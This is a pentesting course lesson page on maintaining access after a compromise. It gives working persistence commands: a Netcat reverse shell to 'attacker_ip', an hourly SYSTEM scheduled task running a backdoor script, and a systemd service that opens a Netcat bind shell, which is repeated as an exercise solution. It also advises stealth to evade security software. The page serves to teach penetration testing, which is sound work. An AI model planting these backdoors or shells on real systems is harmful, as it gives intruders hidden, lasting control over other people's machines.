<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Maintaining Access</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css?v=4" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725" crossorigin="anonymous"></script>  	
	</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-6 p-2 p-md-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo-header_enterprise.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-6 p-2 p-md-0 text-end">
			<span>	<b id="lit_lang_es" class="px-2">EN</b>
	|
	<a href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">ES</a></b>
	|
	<a href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">CA</a>
</span>
			<span class="d-none d-md-inline"><br><cite>All the knowledge within your reach</cite></span>
		</div>
	</div>
</div>
<div class="subheader container-xxl d-none d-md-block">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective">The Project</a> | 
<a href="/about">About Us</a> | 
<a href="/contribute">Contribute</a> | 
<a href="/donate">Donations</a> | 
<a href="/licence">License</a>
		</div>
	</div>
</div>

<div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
					 				<a href="/"><i class="bi bi-house-fill"></i> HOME</a>
											</div>
		</div>
	</div>
</div>
		
<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
				<div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation">
				<span class="d-none d-md-inline">&#x25C4; Previous</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Maintaining Access</h2></a>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks">
				<span class="d-none d-md-inline">Next &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>
<div class='content'><p>Maintaining access is a crucial phase in the post-exploitation process of penetration testing. Once a pentester has successfully exploited a vulnerability and gained access to a target system, the next step is to ensure that this access can be maintained for further analysis and exploitation. This involves setting up backdoors, creating persistent access points, and ensuring that the access remains undetected by the system's defenses.</p>
</div><h1>Key Concepts</h1>
<div class='content'><ol>
<li><strong>Persistence Mechanisms</strong>: Techniques used to maintain access to a compromised system even after reboots or other interruptions.</li>
<li><strong>Backdoors</strong>: Hidden methods to bypass normal authentication and gain access to a system.</li>
<li><strong>Rootkits</strong>: Malicious software designed to hide the presence of certain processes or programs from normal methods of detection.</li>
<li><strong>Command and Control (C2) Servers</strong>: Servers used by attackers to communicate with compromised systems and control them remotely.</li>
</ol>
</div><h1>Techniques for Maintaining Access</h1>
<div class='content'></div><h2><ol>
<li>Creating Backdoors</li>
</ol></h2>
<div class='content'><p>Backdoors are one of the most common methods for maintaining access. They allow attackers to bypass normal authentication mechanisms and regain access to the system at any time.</p>
<h4>Example: Creating a Simple Backdoor with Netcat</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBPbiB0aGUgYXR0YWNrZXIncyBtYWNoaW5lIChsaXN0ZW5pbmcgZm9yIGNvbm5lY3Rpb25zKQpuYyAtbHZwIDQ0NDQKCiMgT24gdGhlIHRhcmdldCBtYWNoaW5lIChjb25uZWN0aW5nIGJhY2sgdG8gdGhlIGF0dGFja2VyJ3MgbWFjaGluZSkKbmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyX2lwIDQ0NDQ="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># On the attacker's machine (listening for connections)
nc -lvp 4444

# On the target machine (connecting back to the attacker's machine)
nc -e /bin/bash attacker_ip 4444</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li><code>nc -lvp 4444</code>: This command sets up Netcat to listen on port 4444 for incoming connections.</li>
<li><code>nc -e /bin/bash attacker_ip 4444</code>: This command on the target machine connects back to the attacker's machine and provides a bash shell.</li>
</ul>
</div><h2><ol start="2">
<li>Using Scheduled Tasks</li>
</ol></h2>
<div class='content'><p>Scheduled tasks can be used to execute scripts or commands at regular intervals, ensuring that access is maintained even after reboots.</p>
<h4>Example: Creating a Scheduled Task on Windows</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhdGUgYSBzY2hlZHVsZWQgdGFzayB0byBydW4gYSBiYWNrZG9vciBzY3JpcHQgZXZlcnkgaG91cgpzY2h0YXNrcyAvY3JlYXRlIC90biAiQmFja2Rvb3JUYXNrIiAvdHIgIkM6XGJhY2tkb29yLmJhdCIgL3NjIGhvdXJseSAvcnUgU1lTVEVN"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Create a scheduled task to run a backdoor script every hour
schtasks /create /tn &quot;BackdoorTask&quot; /tr &quot;C:\backdoor.bat&quot; /sc hourly /ru SYSTEM</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li><code>schtasks /create</code>: Command to create a new scheduled task.</li>
<li><code>/tn &quot;BackdoorTask&quot;</code>: Name of the task.</li>
<li><code>/tr &quot;C:\backdoor.bat&quot;</code>: Path to the script to be executed.</li>
<li><code>/sc hourly</code>: Schedule the task to run every hour.</li>
<li><code>/ru SYSTEM</code>: Run the task with SYSTEM privileges.</li>
</ul>
</div><h2><ol start="3">
<li>Modifying System Services</li>
</ol></h2>
<div class='content'><p>Modifying existing system services or creating new ones can provide a persistent method of maintaining access.</p>
<h4>Example: Creating a New Service on Linux</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhdGUgYSBuZXcgc2VydmljZSBmaWxlCmVjaG8gLWUgIltVbml0XVxuRGVzY3JpcHRpb249QmFja2Rvb3IgU2VydmljZVxuXG5bU2VydmljZV1cbkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgJ25jIC1sdnAgNDQ0NCAtZSAvYmluL2Jhc2gnXG5cbltJbnN0YWxsXVxuV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQiID4gL2V0Yy9zeXN0ZW1kL3N5c3RlbS9iYWNrZG9vci5zZXJ2aWNlCgojIFJlbG9hZCBzeXN0ZW1kIG1hbmFnZXIgY29uZmlndXJhdGlvbgpzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZAoKIyBFbmFibGUgYW5kIHN0YXJ0IHRoZSBuZXcgc2VydmljZQpzeXN0ZW1jdGwgZW5hYmxlIGJhY2tkb29yLnNlcnZpY2UKc3lzdGVtY3RsIHN0YXJ0IGJhY2tkb29yLnNlcnZpY2U="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Create a new service file
echo -e &quot;[Unit]\nDescription=Backdoor Service\n\n[Service]\nExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'\n\n[Install]\nWantedBy=multi-user.target&quot; &gt; /etc/systemd/system/backdoor.service

# Reload systemd manager configuration
systemctl daemon-reload

# Enable and start the new service
systemctl enable backdoor.service
systemctl start backdoor.service</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li>The service file defines a new service that starts a Netcat listener on port 4444 and provides a bash shell.</li>
<li><code>systemctl daemon-reload</code>: Reloads the systemd manager configuration.</li>
<li><code>systemctl enable backdoor.service</code>: Enables the service to start at boot.</li>
<li><code>systemctl start backdoor.service</code>: Starts the service immediately.</li>
</ul>
</div><h1>Practical Exercise</h1>
<div class='content'></div><h2>Exercise: Setting Up a Persistent Backdoor</h2>
<div class='content'><p><strong>Objective</strong>: Set up a persistent backdoor on a Linux system using a systemd service.</p>
<p><strong>Steps</strong>:</p>
<ol>
<li>Create a new service file for the backdoor.</li>
<li>Reload the systemd manager configuration.</li>
<li>Enable and start the new service.</li>
</ol>
<p><strong>Solution</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBTdGVwIDE6IENyZWF0ZSBhIG5ldyBzZXJ2aWNlIGZpbGUKZWNobyAtZSAiW1VuaXRdXG5EZXNjcmlwdGlvbj1CYWNrZG9vciBTZXJ2aWNlXG5cbltTZXJ2aWNlXVxuRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAnbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaCdcblxuW0luc3RhbGxdXG5XYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldCIgPiAvZXRjL3N5c3RlbWQvc3lzdGVtL2JhY2tkb29yLnNlcnZpY2UKCiMgU3RlcCAyOiBSZWxvYWQgc3lzdGVtZCBtYW5hZ2VyIGNvbmZpZ3VyYXRpb24Kc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQKCiMgU3RlcCAzOiBFbmFibGUgYW5kIHN0YXJ0IHRoZSBuZXcgc2VydmljZQpzeXN0ZW1jdGwgZW5hYmxlIGJhY2tkb29yLnNlcnZpY2UKc3lzdGVtY3RsIHN0YXJ0IGJhY2tkb29yLnNlcnZpY2U="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Step 1: Create a new service file
echo -e &quot;[Unit]\nDescription=Backdoor Service\n\n[Service]\nExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'\n\n[Install]\nWantedBy=multi-user.target&quot; &gt; /etc/systemd/system/backdoor.service

# Step 2: Reload systemd manager configuration
systemctl daemon-reload

# Step 3: Enable and start the new service
systemctl enable backdoor.service
systemctl start backdoor.service</pre></div><div class='content'></div><h1>Common Mistakes and Tips</h1>
<div class='content'><ul>
<li>
<p><strong>Mistake</strong>: Forgetting to reload the systemd manager configuration after creating or modifying a service file.</p>
<ul>
<li><strong>Tip</strong>: Always run <code>systemctl daemon-reload</code> after making changes to service files.</li>
</ul>
</li>
<li>
<p><strong>Mistake</strong>: Using easily detectable methods for maintaining access.</p>
<ul>
<li><strong>Tip</strong>: Use stealthy techniques and tools to avoid detection by security software.</li>
</ul>
</li>
<li>
<p><strong>Mistake</strong>: Not testing the persistence mechanism to ensure it works after reboots.</p>
<ul>
<li><strong>Tip</strong>: Always test your persistence mechanisms by rebooting the target system and verifying that access is maintained.</li>
</ul>
</li>
</ul>
</div><h1>Conclusion</h1>
<div class='content'><p>Maintaining access is a critical step in the post-exploitation phase of penetration testing. By using techniques such as creating backdoors, scheduled tasks, and modifying system services, pentesters can ensure that they retain access to compromised systems for further analysis and exploitation. Understanding and implementing these techniques effectively can significantly enhance the success of a penetration test.</p>
</div><div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation">
				<span class="d-none d-md-inline">&#x25C4; Previous</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks">
				<span class="d-none d-md-inline">Next &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<!-- 
<h1>Advertising</h1>
<p>This space is reserved for advertising.</p>
<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
<p>Thank you for collaborating!</p>
-->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725"
     crossorigin="anonymous"></script>
<!-- enterprise_campus -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-0611338592562725"
     data-ad-slot="6914733106"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
			









		</div>
	</div>
</div>

<div class="container-xxl d-block d-md-none">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective">The Project</a> | 
<a href="/about">About Us</a> | 
<a href="/contribute">Contribute</a> | 
<a href="/donate">Donations</a> | 
<a href="/licence">License</a>
		</div>
	</div>
</div>

<div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	We use cookies to improve your user experience and offer content tailored to your interests.
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
